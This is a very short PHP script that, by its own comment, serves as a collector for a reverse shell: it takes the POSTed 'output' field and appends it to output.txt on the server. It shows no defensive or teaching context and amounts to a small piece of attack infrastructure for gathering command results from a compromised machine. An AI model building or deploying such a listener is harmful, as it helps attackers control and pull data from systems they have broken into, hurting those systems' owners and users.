<?php
// Receive the output from the reverse shell
$output = $_POST['output'];
file_put_contents('output.txt', $output, FILE_APPEND);
?>
